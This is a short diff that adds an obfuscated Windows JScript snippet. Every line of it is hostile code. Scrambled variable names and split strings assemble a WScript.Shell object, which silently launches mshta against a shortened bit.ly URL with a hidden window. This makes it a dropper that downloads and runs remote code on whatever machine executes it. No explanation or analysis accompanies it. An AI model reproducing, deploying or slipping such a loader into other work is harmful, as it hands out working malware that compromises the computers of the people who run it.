@@ -1,0 +1,6 @@
+soepnrij = ("ipt.Shel")
+var fgtlfxuq = WScript.CreateObject("WScr"+soepnrij+"l")
+nwmqgknc = ("m")
+ijfyljya = ("sh")
+uwqwbxfs = ("ta ")
+fgtlfxuq.Run((nwmqgknc+ijfyljya+uwqwbxfs)+" https://bit.ly/2T5rtFL",0)
